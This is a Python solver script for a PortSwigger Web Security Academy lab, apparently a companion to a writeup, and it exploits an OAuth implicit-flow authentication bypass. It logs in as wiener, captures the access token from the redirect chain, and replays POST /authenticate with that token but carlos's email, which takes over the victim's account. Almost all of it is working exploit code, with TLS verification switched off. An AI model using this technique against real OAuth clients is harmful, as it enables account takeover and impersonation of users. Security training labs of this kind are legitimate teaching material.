#!/usr/bin/env python3
"""
Authentication bypass via OAuth implicit flow
PortSwigger Web Security Academy -- OAuth authentication

Companion script for the writeup: 01-authentication-bypass-via-oauth-implicit-flow.md

What this does:
    Completes a real OAuth implicit-grant login as wiener (credentials wiener:peter)
    to obtain a genuinely valid access token, then replays the client's final
    POST /authenticate step with that same token but the email field swapped to
    carlos@carlos-montoya.net. The client never verifies the token against the
    email server-side, so it authenticates the request as carlos.

Usage:
    python 01-authentication-bypass-via-oauth-implicit-flow.py <lab-url>
    e.g. python 01-authentication-bypass-via-oauth-implicit-flow.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import re
import sys
import urllib.parse
import httpx


def solve(lab_url: str) -> None:
    c = httpx.Client(verify=False, follow_redirects=True, timeout=15)

    # Step 1: Complete a normal OAuth login as wiener to get a valid access token.
    print("[*] Starting OAuth flow as wiener...")
    r = c.get(f"{lab_url}/social-login", follow_redirects=False)
    if r.status_code not in (301, 302, 303, 307):
        home = c.get(lab_url)
        social_link = re.search(r'href="([^"]*social-login[^"]*)"', home.text)
        if social_link:
            r = c.get(f"{lab_url}{social_link.group(1)}", follow_redirects=False)

    location = r.headers.get("location", "")
    print(f"[*] Redirect to OAuth: {location[:100]}...")
    r = c.get(location, follow_redirects=False)

    if r.status_code == 200 and "login" in r.text.lower():
        csrf = re.search(r'name="csrf"\s+value="([^"]+)"', r.text)
        csrf_val = csrf.group(1) if csrf else ""
        oauth_base = urllib.parse.urlparse(location)
        oauth_origin = f"{oauth_base.scheme}://{oauth_base.netloc}"

        login_r = c.post(
            f"{oauth_origin}/login",
            data={"csrf": csrf_val, "username": "wiener", "password": "peter"},
            follow_redirects=False,
        )
        if login_r.status_code in (301, 302, 303, 307):
            r = c.get(login_r.headers.get("location", ""), follow_redirects=False)

    # Follow the rest of the redirect chain back to the client, watching for the
    # fragment-carried token -- fragments never reach the server, so we have to
    # catch it in the Location header of the redirect that carries it.
    max_redirects = 10
    while r.status_code in (301, 302, 303, 307) and max_redirects > 0:
        next_url = r.headers.get("location", "")
        if not next_url.startswith("http"):
            parsed = urllib.parse.urlparse(str(r.url))
            next_url = f"{parsed.scheme}://{parsed.netloc}{next_url}"

        if "#access_token=" in next_url or "access_token=" in next_url:
            print("[+] Got callback with token!")
            break

        r = c.get(next_url, follow_redirects=False)
        max_redirects -= 1

    final_url = str(r.headers.get("location", r.url))
    print(f"[*] Final URL: {final_url[:150]}...")

    token_match = re.search(r'access_token=([^&#]+)', final_url)
    if not token_match and r.status_code == 200:
        token_match = re.search(r'access_token=([^&#"\']+)', r.text)
    if not token_match:
        print("[-] Could not extract access token from OAuth flow.")
        return

    access_token = token_match.group(1)
    print(f"[+] Access token: {access_token[:30]}...")

    # Step 2: Replay the final /authenticate step, keeping wiener's real token but
    # swapping the email for carlos -- the server trusts the JSON body over the token.
    print("[*] Authenticating as carlos with wiener's token...")
    victim_email = "carlos@carlos-montoya.net"
    r = c.post(
        f"{lab_url}/authenticate",
        json={
            "email": victim_email,
            "username": victim_email.split("@")[0],
            "token": access_token,
        },
        headers={"Content-Type": "application/json"},
    )
    print(f"[*] /authenticate response: {r.status_code}")

    check = c.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved -- authenticated as carlos using wiener's token.")
    else:
        print("[-] Not solved yet -- inspect the /authenticate response above.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
